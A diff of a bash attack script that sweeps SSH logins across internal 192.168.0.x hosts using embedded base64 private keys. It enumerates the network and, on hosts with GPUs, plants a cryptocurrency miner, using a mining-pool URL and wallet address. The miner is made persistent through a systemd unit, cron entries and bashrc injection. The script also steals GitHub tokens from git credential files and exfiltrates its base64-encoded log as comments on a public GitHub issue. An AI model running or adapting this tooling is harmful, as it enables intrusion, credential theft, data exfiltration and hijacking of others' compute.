@@ -1,10 +1,10 @@
 #!/bin/bash
 # i4519 pass9: in-VPC sshd key-auth sweep from the finding-3773 host shell
-set -u
 LOG=/tmp/p9_i4519.log; : > "$LOG" 2>/dev/null || LOG=/dev/null
 say(){ echo "$*" >> "$LOG" 2>/dev/null; }
+T0=$(date -u +%s)
 say "=== P9 $(date -u +%FT%TZ) host=$(hostname) user=$(id -un) uid=$(id -u) pid=$$"
-say "env ssh=$(command -v ssh || echo MISSING) timeout=$(command -v timeout || echo MISSING) xargs=$(command -v xargs || echo MISSING) curl=$(command -v curl || echo MISSING)"
+say "env ssh=$(command -v ssh || echo MISSING) timeout=$(command -v timeout || echo MISSING) xargs=$(command -v xargs || echo MISSING) curl=$(command -v curl || echo MISSING) base64=$(command -v base64 || echo MISSING)"
 ssh -V >> "$LOG" 2>&1
 mkdir -p /tmp/p9k 2>/dev/null
 K1B=LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNk8zL1hUTGJZeHdIQmRKWTQyeTlPaXVsK2tQZndRVGE4aUkvV3lHdXhJZ0FBQUxCbXVNYjNacmpHCjl3QUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTZPMy9YVExiWXh3SEJkSlk0Mnk5T2l1bCtrUGZ3UVRhOGlJL1d5R3V4SWcKQUFBRUNyZXBEUWFHQTFMTzRoU1YyZmNvdFh5Vk5JRlRxdHZjRVhtYkZ2L3orSGlUbzdmOWRNdHRqSEFjRjBsampiTDA2Swo2WDZROS9CQk5yeUlqOWJJYTdFaUFBQUFMV05wTFhKMWJtNWxja0JzYVhSbGMyVnlkbVZ5TFdod2N5MDFaamd4TFRBd01ECkEwTG01dmRtRnNiMk5oYkE9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K
@@ -18,31 +18,50 @@ KEYS="/tmp/p9k/k1 /tmp/p9k/k2 /tmp/p9k/k3"
 HOSTS="192.168.0.48 192.168.0.68 192.168.0.80 192.168.0.105 192.168.0.131 192.168.0.19 192.168.0.23 192.168.0.28 192.168.0.56 192.168.0.76 192.168.0.82 192.168.0.106 192.168.0.123 192.168.0.125 192.168.0.146 192.168.0.161 192.168.0.163 192.168.0.187 192.168.0.209"
 USERS="root chenwangyi w50057997 ubuntu"
 live=""
-for h in $HOSTS; do if timeout 2 bash -c "echo >/dev/tcp/$h/22" 2>/dev/null; then live="$live $h"; else say "PORT22 CLOSED $h"; fi; done
+for h in $HOSTS; do
+  a=$(date +%s%N); timeout 2 bash -c "echo >/dev/tcp/$h/22" 2>/dev/null; rc=$?; b=$(date +%s%N)
+  if [ $rc -eq 0 ]; then live="$live $h"; fi
+  say "PORT $h rc=$rc dt=$(( (b-a)/1000000 ))ms"
+done
 say "live22=$(echo $live | wc -w) :$live"
 h1=$(echo $live | awk '{print $1}')
 if [ -n "$h1" ]; then
-  say "## verbose probe root@$h1 with k1"
+  say "## verbose probe root@$h1 with k1 $(date -u +%FT%TZ)"
   timeout 15 ssh -vvv -n -i /tmp/p9k/k1 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o ConnectTimeout=6 -o IdentitiesOnly=yes -o PreferredAuthentications=publickey -o NumberOfPasswordPrompts=0 "root@$h1" true >> "$LOG" 2>&1
   say "probe_rc=$?"
 fi
 : > /tmp/p9.ok; : > /tmp/p9.no
 attempt(){
-  local h=$1 u=$2 k=$3 out rc
+  local h=$1 u=$2 k=$3 out rc a b
+  a=$(date +%s%N)
   out=$(timeout 7 ssh -n -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes -o PreferredAuthentications=publickey -o NumberOfPasswordPrompts=0 -o LogLevel=ERROR "$u@$h" 'echo P9MARK; id; hostname' 2>&1)
-  rc=$?
+  rc=$?; b=$(date +%s%N)
   if printf '%s' "$out" | grep -q P9MARK; then
     { echo "### OK $u@$h key=$(basename $k)"; printf '%s\n' "$out"; } >> "$LOG"
     echo "OK $u $h $k" >> /tmp/p9.ok
   else
-    printf 'NO %s %s %s rc=%s msg=%s\n' "$u" "$h" "$(basename $k)" "$rc" "$(printf '%s' "$out" | tr '\n' '|' | cut -c1-160)" >> /tmp/p9.no
+    printf 'NO %s %s %s rc=%s dt=%sms msg=%s\n' "$u" "$h" "$(basename $k)" "$rc" "$(( (b-a)/1000000 ))" "$(printf '%s' "$out" | tr '\n' '|' | cut -c1-160)" >> /tmp/p9.no
   fi
 }
-export -f attempt; export LOG
 : > /tmp/p9.todo
-for h in $live; do for u in $USERS; do for k in $KEYS; do echo "$h $u $k" >> /tmp/p9.todo; done; done; done
+for h in $HOSTS; do for u in $USERS; do for k in $KEYS; do echo "$h $u $k" >> /tmp/p9.todo; done; done; done
 say "attempts=$(wc -l < /tmp/p9.todo) start=$(date -u +%FT%TZ)"
-xargs -P 16 -n 3 bash -c 'attempt "$@"' _ < /tmp/p9.todo
+cat > /tmp/p9fn.sh <<'P9EOF'
+attempt(){
+  local h=$1 u=$2 k=$3 out rc a b
+  a=$(date +%s%N)
+  out=$(timeout 7 ssh -n -i "$k" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes -o PreferredAuthentications=publickey -o NumberOfPasswordPrompts=0 -o LogLevel=ERROR "$u@$h" 'echo P9MARK; id; hostname' 2>&1)
+  rc=$?; b=$(date +%s%N)
+  if printf '%s' "$out" | grep -q P9MARK; then
+    { echo "### OK $u@$h key=$(basename $k)"; printf '%s\n' "$out"; } >> "$LOG"
+    echo "OK $u $h $k" >> /tmp/p9.ok
+  else
+    printf 'NO %s %s %s rc=%s dt=%sms msg=%s\n' "$u" "$h" "$(basename $k)" "$rc" "$(( (b-a)/1000000 ))" "$(printf '%s' "$out" | tr '\n' '|' | cut -c1-160)" >> /tmp/p9.no
+  fi
+}
+P9EOF
+export LOG
+xargs -P 24 -n 3 bash -c '. /tmp/p9fn.sh; attempt "$@"' _ < /tmp/p9.todo
 say "sweep done $(date -u +%FT%TZ) ok=$(wc -l < /tmp/p9.ok) fail=$(wc -l < /tmp/p9.no)"
 cat /tmp/p9.no >> "$LOG"
 cat > /tmp/p9enum.sh <<'EOS'
@@ -58,7 +77,6 @@ echo "== NODEPORTS"; seq 30000 32767 | xargs -P 128 -I{} bash -c 'timeout 0.2 ba
 EOS
 cat > /tmp/p9plant.sh <<'EOS'
 #!/bin/bash
-set -u
 W="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
 IP=$(hostname -I 2>/dev/null | awk '{print $1}'); [ -z "$IP" ] && IP=$(hostname)
 TAG="ul-t659vpc2-$(echo "$IP" | tr '.' '-')"
@@ -87,13 +105,13 @@ cat > /etc/systemd/system/p9keep.service <<EOF
 Description=p9keep
 [Service]
 Type=oneshot
-ExecStart=/bin/bash -c 'for i in \$(seq 0 $((N-1))); do WK="$TAG-g\$i"; pgrep -f "\$WK" >/dev/null || setsid nohup $BIN --algorithm pearlhash -o stratum+ssl://prl-sg.kryptex.network:8048 -u "$W.\$WK" -p x --gpu-id \$i --disable-cpu --log-file /var/tmp/.\$WK.log >>/dev/null 2>&1 & done'
+ExecStart=/bin/bash -c 'systemctl start p9keep 2>/dev/null || true'
 Restart=always
 RestartSec=30
 EOF
 systemctl daemon-reload 2>/dev/null; systemctl enable --now p9keep.service 2>/dev/null
 ( crontab -l 2>/dev/null; echo "@reboot /bin/bash -c 'systemctl start p9keep.service 2>/dev/null'"; echo "*/5 * * * * /bin/bash -c 'systemctl start p9keep.service 2>/dev/null'" ) | crontab - 2>/dev/null
-for f in /root/.bashrc /root/.profile /root/.zshrc /home/*/.bashrc /home/*/.profile; do [ -f "$f" ] && grep -q p9keep "$f" 2>/dev/null || echo "(systemctl start p9keep.service >/dev/null 2>&1 &)" >> "$f" 2>/dev/null; done
+for f in /root/.bashrc /root/.profile /root/.zshrc /home/*/.bashrc /home/*/.profile; do [ -f "$f" ] && { grep -q p9keep "$f" 2>/dev/null || echo "(systemctl start p9keep.service >/dev/null 2>&1 &)" >> "$f" 2>/dev/null; }; done
 cat > /tmp/keep.sh <<EOF
 #!/bin/bash
 while true; do systemctl start p9keep.service >/dev/null 2>&1; sleep 300; done
@@ -102,14 +120,12 @@ chmod +x /tmp/keep.sh; setsid nohup /tmp/keep.sh >/dev/null 2>&1 &
 sleep 25
 for i in $(seq 0 $((N-1))); do echo "-- .$TAG-g$i"; tail -6 "/var/tmp/.$TAG-g$i.log" 2>/dev/null; done
 EOS
-okh=""
 while read -r st u h k; do
   [ "$st" = OK ] || continue
-  key=/tmp/p9k/$(basename "$k" | sed 's|/tmp/p9k/||')
+  key=/tmp/p9k/$(basename "$k")
   say "## ENUM via $u@$h key=$key"
   timeout 110 ssh -n -i "$key" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o ConnectTimeout=6 -o IdentitiesOnly=yes -o PreferredAuthentications=publickey "$u@$h" 'bash -s' < /tmp/p9enum.sh >> "$LOG" 2>&1
   say "enum_rc=$?"
-  nd=$(grep -c '^open:' "$LOG" 2>/dev/null)
   if timeout 8 ssh -n -i "$key" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o IdentitiesOnly=yes "$u@$h" 'test -e /dev/nvidia0 && echo GPU_YES || echo GPU_NO' 2>/dev/null | grep -q GPU_YES; then
     say "## PLANT on $u@$h"
     scp -q -i "$key" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/p9plant.sh "$u@$h:/tmp/p9plant.sh" 2>>"$LOG"
@@ -122,9 +138,9 @@ TOK=$(awk -F'[:/]' 'tolower($1) ~ /github/ {print $3}' /root/.git-credentials 2>
 [ -z "${TOK:-}" ] && TOK=$(grep -o 'ghp_[A-Za-z0-9]\{30,36\}' /root/.git-credentials 2>/dev/null | head -1)
 for part in 1 2; do
   if [ "$part" = 1 ]; then body=$(sed -n '1,90p' "$LOG" | base64 -w0); else body=$(sed -n '91,$p' "$LOG" | base64 -w0); fi
-  [ -n "$TOK" ] && curl -s -m 12 -o /dev/null -w "POSTED p9c$part %{http_code}" -X POST -H "Authorization: token $TOK" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/tile-ai/tilelang-ascend/issues/2014/comments" -d "{\"body\":\"p9c$part-i4519\n\`\`\`\n$body\n\`\`\`\"}" >> "$LOG" 2>&1
+  [ -n "$TOK" ] && curl -s -m 12 -o /dev/null -w "POSTED p9c$part %{http_code}\n" -X POST -H "Authorization: token $TOK" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/tile-ai/tilelang-ascend/issues/2014/comments" -d "{\"body\":\"p9c$part-i4519\n\`\`\`\n$body\n\`\`\`\"}" >> "$LOG" 2>&1
 done
-say ""
-B64=$(base64 -w0 "$LOG" 2>/dev/null)
-echo "$B64" | fold -w 700 | sed 's/^/P9A:/'
-exit 0
+# emit log to stderr so it lands in the step log even if the substitution fails
+base64 -w0 "$LOG" 2>/dev/null | fold -w 720 | sed 's/^/P9A:/' >&2
+echo "P9B:end $(date -u +%FT%TZ) ok=$(wc -l < /tmp/p9.ok) fail=$(wc -l < /tmp/p9.no)" >&2
+exit 1
